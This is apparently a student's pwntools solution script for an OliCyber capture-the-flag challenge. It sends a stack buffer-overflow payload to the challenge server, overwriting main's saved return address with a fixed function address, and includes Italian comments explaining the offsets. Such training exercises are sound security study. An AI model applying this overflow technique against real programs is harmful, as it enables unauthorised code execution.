#Gregorio Maria Vallé 5^C Informatica 21/09/2023

from pwn import * 

r = remote("moreprivateclub.challs.olicyber.it", 10016)

r.recvline()

r.sendline(b"18")

r.recvline()

r.sendline(b"A"*47 + b"B"*8 + p64(0x4012ce)) #semplicemente vado a sovrascrivere il return del main con l'indirizzo della funzione dentro l'if

# stack variabile A*47 = (char)35 + (int)3
# 8 byte base pointer 
# p64() = indirizzo della funzione 

r.interactive()

